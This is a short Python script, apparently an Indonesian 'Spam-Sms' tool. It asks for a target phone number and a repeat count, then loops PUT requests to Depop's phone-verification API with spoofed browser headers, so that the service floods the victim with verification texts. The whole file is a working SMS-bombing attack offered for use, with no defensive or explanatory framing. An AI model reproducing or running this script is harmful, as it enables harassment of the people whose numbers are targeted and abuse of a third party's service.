import requests,json,os,time
from requests  import put

banner="""
\WELCOME TO DI TOOLS RIZKI
\t--- -- -

[*] Creator = RIZKI
[*] GITHUB = https://github.com/RIZKI/Spam-Sms

"""
os.system("clear")
print(banner)
nomor=input("[+] nomor: ")
jumlah=int(input("[+] Jumlah: "))
print()
headers={
"Host":"webapi.depop.com",
"content-length":"50",
"accept":"application/json, text/plain, */*",
"save-data":"on",
"user-agent":"Mozilla/5.0 (Linux; Android 10; W-V730-ID) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36",
"content-type":"application/json",
"origin":"https://signup.depop.com",
"sec-fetch-site":"same-site",
"sec-fetch-mode":"cors",
"sec-fetch-dest":"empty",
"referer":"https://signup.depop.com/",
"accept-encoding":"gzip, deflate, br",
"accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
}
data={
"phone_number":nomor,
"country_code":"ID"
}
for i in range(int(jumlah)):
    respon=requests.put("https://webapi.depop.com/api/v1/auth/verify/phone",headers=headers,json=data)
    sanz=json.loads(respon.text)
    if sanz["is_verified"]==False:
         print("Spam Sms Berhasil")
    else:
         print("Spam Sms Gagal")
